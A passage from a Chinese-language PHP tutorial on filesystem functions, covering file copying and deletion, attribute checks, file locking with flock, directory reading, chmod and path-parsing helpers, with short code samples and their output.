punctuation">;</span>   <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fi</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(2)创建文件并复制到其他文件夹下面<font color="#FF7F00">↓↓</font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//创建文件</span>   <span class="token variable">$fi</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'copy.txt'</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fi</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//旧文件名 </span>   <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'copy.txt'</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//新文件名   </span>   <span class="token variable">$filename2</span> <span class="token operator">=</span> <span class="token string">"./01/copy.txt"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//修改名字。</span>   <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filename2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fi</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="4-3-删除文件"><font color="#3CB371" face="Comic sans MS">4.3 删除文件</font><a href="post/PHP-FileSystem#4-3-删除文件"></a></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>unlink(指定路径的文件)</strong></font>;<br></font> </p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'test.txt'</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">echo</span>  <span class="token string">"删除文件成功 $filename!\n"</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>       <span class="token keyword">echo</span> <span class="token string">"删除 $filename 失败!\n"</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="五-检测文件属性函数"><font color="#FF6347" face="Comic sans MS">五. 检测文件属性函数</font><a href="post/PHP-FileSystem#五-检测文件属性函数"></a></h3><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">函数</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">bool file_exists ( $指定文件名或者文件路径)</td><td align="left">文件是否存在</td></tr><tr><td align="left">bool is_readable ( $指定文件名或者文件路径)</td><td align="left">文件是否可读</td></tr><tr><td align="left">bool is_writeable ( $指定文件名或者文件路径)</td><td align="left">文件是否可写</td></tr><tr><td align="left">bool is_executable ( $指定文件名或者文件路径)</td><td align="left">文件是否可执行</td></tr><tr><td align="left">bool is_file ( $指定文件名或者文件路径)</td><td align="left">是否是文件</td></tr><tr><td align="left">bool is_dir ( $指定文件名或者文件路径)</td><td align="left">是否是目录</td></tr><tr><td align="left">void clearstatcache ( void )</td><td align="left">清楚文件的状态缓存</td></tr></tbody></table></div></div><p>&emsp;</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$g</span><span class="token operator">=</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"install.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$g</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'install.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'已安装，请不要再次进行安装'</span><span class="token punctuation">;</span>   exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span>     <span class="token keyword">echo</span> <span class="token number">5462564</span><span class="token punctuation">;</span><span class="token delimiter">?></span>运行结果：<span class="token number">1</span> 已安装，请不要再次进行安装<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="六-文件常用函数和常量"><font color="#FF6347" face="Comic sans MS">六. 文件常用函数和常量</font><a href="post/PHP-FileSystem#六-文件常用函数和常量"></a></h3><h4 id="6-1-目录分割符常量"><font color="#3CB371" face="Comic sans MS">6.1 目录分割符常量</font><a href="post/PHP-FileSystem#6-1-目录分割符常量"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">平台</th><th align="left">分割符</th></tr></thead><tbody><tr><td align="center">windows</td><td align="left">\ 或者 /</td></tr><tr><td align="center">类unix</td><td align="left">/</td></tr></tbody></table></div></div><blockquote><ol><li>windows 的路径格式为 d:\xxx\xxx 注意：windows支持 d:/xxx/xxx</li><li>linux 的路径格式为 /home/xxx/xxx 注意：如果\home\xxx\xxx 在linux上是<strong>错误</strong>的</li><li>所以当开启转义之类的话，转义字符 \ 用一起的话 d:\xxx\xxx 是一样的。判断时候有两个 \ 有的话 再转成一个\ 再把 \ 替换成 /当路径分割，这样在linux上或者windos上的路径就能保持统一了。</li></ol></blockquote><p>&emsp;</p><h4 id="6-2-DIRECTORY-SEPARATOR常量"><font color="#3CB371" face="Comic sans MS">6.2 DIRECTORY_SEPARATOR常量</font><a href="post/PHP-FileSystem#6-2-DIRECTORY-SEPARATOR常量"></a></h4><p><font face="Comic sans MS">在 Windows 中，斜线（/）和反斜线（\）都可以用作目录分隔符，在linux上路径的分隔符是/，这就导致了一个问题，比如开发机器是windows，有一个图片上传程序，，而我们又使用了(\)作为文件分隔符，调试机器上指定的上传文件保存目录是：<br>define(‘ROOT’,dirname(_<em>FILE_</em>).”\upload”)，在本地调试都很正常，但是上传到linux服务器的时候会发现会出错。<br>这个问题就是出在文件的分隔符上，windows上习惯性的使用\作为文件分隔符，但是在linux上人家是不认识这个标识的，人家只认识/，于是就要引入下面这个php内置变量了：<font color="#00B2EE"><strong>DIRECTORY_SEPARATOR</strong></font>。</font></p><p>上面的写法可以改写为以下无错写法：<br>define(‘ROOT’,dirname(_<em>FILE_</em>).DIRECTORY_SEPARATOR.”upload”);<br>这样就可以确保不会出错了。<br></p><blockquote><p><font color="#FF7F00"><strong>总结：</strong></font><br>DIRECTORY_SEPARATOR是一个<font color="#FF7F00"><strong>返回跟操作系统相关的路径分隔符</strong></font>的php内置命令，在windows上返回\，而在linux或者类unix上返回/，就是这么个区别，通常在定义包含文件路径或者上传保存目录的时候会用到。</p></blockquote><p>&emsp;</p><h4 id="6-3-文件指针操作函数"><font color="#3CB371" face="Comic sans MS">6.3 文件指针操作函数</font><a href="post/PHP-FileSystem#6-3-文件指针操作函数"></a></h4><p><font color="#00B2EE"><strong>rewind ( resource handle)</strong></font></p><blockquote><p><strong>功能：指针回到开始处</strong></p></blockquote><p><font color="#00B2EE"><strong>fseek ( resource handle, int offset [, int from_where])</strong></font></p><blockquote><p><strong>功能：文件指针向后移动指定字符</strong></p></blockquote><p><strong>注意：</strong>我们在之前的读取当中我们发现fread读取指定长度的数据。读取指定长度的内容，下次再读取的时候<strong>从原位置开始再接着向后读取</strong>。</p><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_fseek.asp" target="_blank" rel="noopener">PHP fseek() 函数</a>]</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">file</td><td align="left">必需。规定要在其中定位的文件。</td></tr><tr><td align="center">offset</td><td align="left">必需。<strong>规定新的位置</strong>（从文件头开始以字节数度量）。</td></tr><tr><td align="center">whence</td><td align="left">可选。<br>可能的值：<br>SEEK_SET - 设定位置等于 offset 字节。默认。<br>SEEK_CUR - 设定位置为当前位置加上 offset。<br>SEEK_END - 设定位置为文件末尾加上 offset （要移动到文件尾之前的位置，offset 必须是一个<br>负值）。</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="6-4-filesize-检测文件的大小"><font color="#3CB371" face="Comic sans MS">6.4 filesize 检测文件的大小</font><a href="post/PHP-FileSystem#6-4-filesize-检测文件的大小"></a></h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'demo.txt'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">'文件大小为: '</span> <span class="token punctuation">.</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">' bytes'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>还有一些其他操作文件的函数，读取文件：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数名</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">file</td><td align="left">把整个文件读入一个数组中</td></tr><tr><td align="center">fgets</td><td align="left">从文件指针中读取一行,读到最后返回false</td></tr><tr><td align="center">fgetc</td><td align="left">从文件指针中读取一个字符，读到最后返回false</td></tr><tr><td align="center">ftruncate</td><td align="left">将文件截断到给定的长度</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="6-5-文件的时间函数"><font color="#3CB371" face="Comic sans MS">6.5 文件的时间函数</font><a href="post/PHP-FileSystem#6-5-文件的时间函数"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数名</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">filectime</td><td align="left">文件创建时间</td></tr><tr><td align="center">filemtime</td><td align="left">文件修改时间</td></tr><tr><td align="center">fileatime</td><td align="left">文件上次访问时间</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'demo.txt'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'$filename文件的上次访问时间是:'</span>  <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span> <span class="token function">fileatime</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token string">'$filename文件的创建时间是: '</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span> <span class="token function">filectime</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'$filename文件的修改时间是: '</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="七-文件锁处理机制"><font color="#FF6347" face="Comic sans MS">七. 文件锁处理机制</font><a href="post/PHP-FileSystem#七-文件锁处理机制"></a></h3><blockquote><p><strong>文件锁的用途：</strong><br>若一个人在写入一个文件，另外一个人同时也打个了这个文件进行写入文件。<br>这情况下，如果遇到一定的碰撞概率的话，不知道到底谁的操作为准。<br>因此，这个时候我们引入锁机制。<br>若用户A在写入或者读取这个文件的时候，将文件加上共享所。我可以读，其他人也可以读。<br>但是，我如果这与的时候。我使用独占锁。这个文件归我了，你们都别动，除非我将文件锁进行释放。</p></blockquote><p><font color="#FF7F00"><strong>注意：不论加上了文件锁后要注意释放。</strong></font></p><p><strong>bool</strong> <font color="#00B2EE"><strong>flock(file,lock,block)</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">file</td><td align="left">必需。规定要锁定或释放的已打开的文件。</td></tr><tr><td align="center">lock</td><td align="left">必需。规定要使用哪种锁定类型。<br>lock 参数可以是以下值之一：<br>要取得共享锁定（读取的程序），将 lock 设为 LOCK_SH（PHP 4.0.1 以前的版本设置为 1）<br>要取得独占锁定（写入的程序），将 lock 设为 LOCK_EX（PHP 4.0.1 以前的版本中设置为 2）<br>要释放锁定（无论共享或独占），将 lock 设为 LOCK_UN（PHP 4.0.1 以前的版本中设置为 3）<br>如果不希望 flock() 在锁定时堵塞，则给 lock 加上 LOCK_NB(PHP 4.0.1 以前的版本中设置为 4)</td></tr><tr><td align="center">block</td><td align="left">可选。若设置为 1 或 true，则当进行锁定时阻挡其他进程。</td></tr></tbody></table></div></div><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"demo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 进行排它型锁定</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">flock</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token constant">LOCK_EX</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"文件这个时候被我独占了哟\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 释放锁定</span>   <span class="token function">flock</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token constant">LOCK_UN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">"锁失败，可能有人在操作，这个时候不能将文件上锁"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>说明：</strong></p><ol><li>上例中我为了写入文件，把文件加上了独占锁。</li><li>如果我操作完成，写入完成后，解除掉了独占锁。</li></ol></blockquote><p>&emsp;<br>&emsp;</p><h3 id="八-目录-文件夹-处理函数"><font color="#FF6347" face="Comic sans MS">八. 目录(文件夹)处理函数</font><a href="post/PHP-FileSystem#八-目录-文件夹-处理函数"></a></h3><blockquote><p><font color="#FF7F00"><strong>处理文件夹的基本思想如下：</strong></font></p><ol><li>读取某个路径的时候判断是否是文件夹</li><li>是文件夹的话，打开指定文件夹，返回文件目录的资源变量</li><li>使用readdir读取一次目录中的文件，目录指针向后偏移一次</li><li>使用readdir读取到最后，没有可读的文件返回false</li><li>关闭文件目录</li></ol></blockquote><p>&emsp;<br>常用函数：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数名</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">opendir()</td><td align="left">打开文件夹，返回操作资源 &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_opendir.asp" target="_blank" rel="noopener">PHP opendir() 函数</a>]</font></td></tr><tr><td align="center">readdir()</td><td align="left">读取文件夹资源,返回目录中下一个文件的文件名。 &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_readdir.asp" target="_blank" rel="noopener">PHP readdir() 函数</a>]</font></td></tr><tr><td align="center">is_dir()</td><td align="left">判断是否是文件夹  &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_is_dir.asp" target="_blank" rel="noopener">PHP is_dir() 函数</a>]</font></td></tr><tr><td align="center">closedir()</td><td align="left">关闭文件夹操作资源  &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_closedir.asp" target="_blank" rel="noopener">PHP is_dir() 函数</a>]</font></td></tr><tr><td align="center">filetype()</td><td align="left">显示是文件夹还是文件，文件显示file，文件夹显示dir <br>可能的类型：（fifo、char、dir、block、link、file、unknown）&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_filetype.asp" target="_blank" rel="noopener">PHP is_dir() 函数</a>]</font></td></tr></tbody></table></div></div><p>&emsp;<br>&emsp;</p><h3 id="九-文件权限设置"><font color="#FF6347" face="Comic sans MS">九. 文件权限设置</font><a href="post/PHP-FileSystem#九-文件权限设置"></a></h3><ol><li><p><strong>文件权限设置的函数</strong>在系统管理级别的软件中很常用。<br>例如：某个文件不准许guest组（来宾用户）查看。</p></li><li><p>在企业管理中，某些用户或者某些用户文件只准读取不准修改。这都是非常常用的功能。</p></li><li><p>注：windows下面有些功能无法实现。</p></li></ol><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数名</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">chmod</td><td align="left">修改读取模式</td></tr><tr><td align="center">chgrp</td><td align="left">修改用户组</td></tr><tr><td align="center">chown</td><td align="left">修改权限</td></tr></tbody></table></div></div><blockquote><p>上面的函数用法与linux的权限操作的用法一样。</p></blockquote><p>&emsp;<br>chmod 主要是修改文件的的权限</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//修改linux  系统/var/wwwroot/某文件权限为755</span><span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/var/wwwroot/index.html"</span><span class="token punctuation">,</span> <span class="token number">755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/var/wwwroot/index.html"</span><span class="token punctuation">,</span> <span class="token string">"u+rwx,go+rx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/somedir/somefile"</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="十-文件路径函数"><font color="#FF6347" face="Comic sans MS">十. 文件路径函数</font><a href="post/PHP-FileSystem#十-文件路径函数"></a></h3><blockquote><p><font color="#FF7F00"><strong>我们经常会遇到处理文件路径的情况。</strong></font></p><ol><li>文件后缀需要取出来</li><li>路径需要取出名字不取目录</li><li>只需要取出路径名中的目录路径</li><li>或者把网址中的各个部份进行解析取得独立值</li><li>甚至是自己组成一个url出来<br>……</li></ol></blockquote><p>&emsp;<br>常用路径处理函数：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数名</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">pathinfo()</td><td align="left">返回文件的各个组成部份</td></tr><tr><td align="center">basename()</td><td align="left">返回文件名</td></tr><tr><td align="center">dirname()</td><td align="left">文件目录部份</td></tr><tr><td align="center">parse_url()</td><td align="left">网址拆解成各部份</td></tr><tr><td align="center">http_build_query()</td><td align="left">生成url 中的query字符串</td></tr><tr><td align="center">http_build_url()</td><td align="left">生成一个url</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="10-1-pathinfo-函数"><font color="#3CB371" face="Comic sans MS">10.1 pathinfo()函数</font><a href="post/PHP-FileSystem#10-1-pathinfo-函数"></a></h4><blockquote><p><font color="#FF7F00"><strong>功能：以关联数组的形式返回文件路径的信息</strong></font></p></blockquote><p><font color="#00B2EE"><strong>pathinfo(path,options)</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">path</td><td align="left">必需。规定要检查的路径。&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_pathinfo.asp" target="_blank" rel="noopener">PHP pathinfo() 函数</a>]</font></td></tr><tr><td align="center">process_sections</td><td align="left">可选。规定要返回的数组元素。默认是 all。<br>可能的值：<br>PATHINFO_DIRNAME - 只返回 dirname<br>PATHINFO_BASENAME - 只返回 basename<br>PATHINFO_EXTENSION - 只返回 extension</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$path_parts</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token string">'d:/www/index.inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'文件目录名：'</span><span class="token punctuation">.</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">'dirname'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'文件全名：'</span><span class="token punctuation">.</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">'basename'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'文件扩展名：'</span><span class="token punctuation">.</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'不包含扩展的文件名：'</span><span class="token punctuation">.</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>结果如下：文件目录名：d<span class="token punctuation">:</span><span class="token operator">/</span>www文件全名：lib<span class="token punctuation">.</span>inc<span class="token punctuation">.</span>php文件扩展名：php不包含扩展的文件名：lib<span class="token punctuation">.</span>inc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="10-2-basename-函数"><font color="#3CB371" face="Comic sans MS">10.2 basename()函数</font><a href="post/PHP-FileSystem#10-2-basename-函数"></a></h4><blockquote><p><font color="#FF7F00"><strong>功能：返回路径中不带有文件扩展名的文件名</strong></font></p></blockquote><p><font color="#00B2EE"><strong>basename(path[,suffix])</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">path</td><td align="left">必需。规定要检查的路径。&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_basename.asp" target="_blank" rel="noopener">PHP basename() 函数</a>]</font></td></tr><tr><td align="center">suffix</td><td align="left">可选。指定文件名到了指定字符停止。</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"1: "</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token string">"d:/www/index.d"</span><span class="token punctuation">,</span> <span class="token string">".d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"2: "</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token string">"d:/www/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"3: "</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token string">"d:/www/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token delimiter">?></span>执行结果如下<span class="token number">1</span><span class="token punctuation">:</span> index<span class="token number">2</span><span class="token punctuation">:</span> index<span class="token punctuation">.</span>php<span class="token number">3</span><span class="token punctuation">:</span> passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="10-3-dirname-函数"><font color="#3CB371" face="Comic sans MS">10.3 dirname()函数</font><a href="post/PHP-FileSystem#10-3-dirname-函数"></a></h4><blockquote><p><font color="#FF7F00"><strong>功能：返回文件路径的文件目录部份,不包含文件名。</strong></font></p></blockquote><p><font color="#00B2EE"><strong>dirname(path)</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">path</td><td align="left">必需。规定要检查的路径。&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_dirname.asp" target="_blank" rel="noopener">PHP dirname() 函数</a>]</font></td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>执行结果如下G<span class="token punctuation">:</span>\<span class="token package">WAMP<span class="token punctuation">\</span>www</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="10-4-parse-url-函数"><font color="#3CB371" face="Comic sans MS">10.4 parse_url()函数</font><a href="post/PHP-FileSystem#10-4-parse-url-函数"></a></h4><blockquote><p><font color="#FF7F00"><strong>功能：将网址拆解成各个部份，返回一个数组</strong></font></p></blockquote><p><font color="#00B2EE"><strong>mixed parse_url ( string $路径 )</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//username:password@hostname:9090/path?arg=value#anchor';</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>结果如下：<span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token string">"scheme"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"http"</span><span class="token punctuation">[</span><span class="token string">"host"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token string">"hostname"</span><span class="token punctuation">[</span><span class="token string">"port"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">9090</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token string">"username"</span><span class="token punctuation">[</span><span class="token string">"pass"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token string">"password"</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"/path"</span><span class="token punctuation">[</span><span class="token string">"query"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span 